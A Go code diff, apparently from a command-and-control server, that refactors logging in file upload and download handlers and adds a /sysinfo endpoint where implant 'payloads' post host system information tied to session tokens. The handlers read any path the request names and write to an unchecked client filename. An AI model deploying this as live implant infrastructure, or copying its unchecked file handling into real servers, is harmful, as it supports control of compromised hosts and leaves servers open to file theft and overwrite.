@@ -4,6 +4,7 @@
 package server
 
 import (
+	"encoding/json"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -17,7 +18,7 @@ func FileUpload(w http.ResponseWriter, req *http.Request) {
 	// retrieve the file from the request
 	file, handler, err := req.FormFile("uploadFile")
 	if err != nil {
-		fmt.Printf("[-] Error retrieving file: %s\n", err)
+		cli.Printf("[-] Error retrieving file: %s\n", err)
 		return
 	}
 
@@ -25,7 +26,7 @@ func FileUpload(w http.ResponseWriter, req *http.Request) {
 	defer file.Close()
 	bytes, err := ioutil.ReadAll(file)
 	if err != nil {
-		fmt.Printf("[-] Error reading the uploaded file: %s\n", err)
+		cli.Printf("[-] Error reading the uploaded file: %s\n", err)
 	}
 
 	// create uploads dir if not existant yet
@@ -33,9 +34,10 @@ func FileUpload(w http.ResponseWriter, req *http.Request) {
 	// read data into local file
 	err = ioutil.WriteFile("uploads/"+handler.Filename, bytes, 0755)
 	if err != nil {
-		fmt.Printf("[-] Error creating and reading into local file: %s\n", err)
+		cli.Printf("[-] Error creating and reading into local file: %s\n", err)
 	}
-	fmt.Println("[+] Successfully uploaded file")
+	cli.Println("[+] Successfully uploaded file")
+	w.Header().Set("Connection", "close")
 	fmt.Fprintf(w, "Successfully uploaded file")
 }
 
@@ -44,17 +46,17 @@ func FileDownload(w http.ResponseWriter, req *http.Request) {
 	// get the filename from the request
 	filename := req.URL.Query().Get("file")
 	if filename == "" {
-		fmt.Println("[-] Download request doesn't contain file name")
+		cli.Println("[-] Download request doesn't contain file name")
 		http.Error(w, "no file indicatd to download", 400)
 		return
 	}
-	fmt.Println("[+] Payload wants to download ", filename)
+	cli.Println("[+] Payload wants to download ", filename)
 
 	// open the file if it exists
 	file, err := os.Open(filename)
 	defer file.Close()
 	if err != nil {
-		fmt.Printf("[-] Error trying to open file: %s\n", err)
+		cli.Printf("[-] Error trying to open file: %s\n", err)
 		http.Error(w, "File not found", 404)
 		return
 	}
@@ -74,11 +76,28 @@ func FileDownload(w http.ResponseWriter, req *http.Request) {
 	// write file into request
 	_, err = io.Copy(w, file)
 	if err != nil {
-		fmt.Printf("[-] Error writing file into response: %s\n", err)
+		cli.Printf("[-] Error writing file into response: %s\n", err)
 		return
 	}
-	fmt.Println("[+] Successfully downloaded file")
+	cli.Println("[+] Successfully downloaded file")
+	w.Header().Set("Connection", "close")
 	fmt.Fprintf(w, "Successfully downloaded file")
 }
 
 // GetSysinfo handles the /sysinfo endpoint.
+func GetSysinfo(w http.ResponseWriter, req *http.Request) {
+	if req.Method == "POST" {
+		index := FindSessionIndexByToken(req.Header.Get("token"))
+		cli.Println("[+] Got system information from session: ", index)
+		body, _ := ioutil.ReadAll(req.Body)
+		defer req.Body.Close()
+
+		err := json.Unmarshal(body, &Sessions[index].SysInfo)
+		if err != nil {
+			cli.Printf("[-] Error while parsing the JSON system information: %s\n", err)
+		}
+
+		w.Header().Set("Connection", "close")
+		fmt.Fprintf(w, "Successfully got system information")
+	}
+}
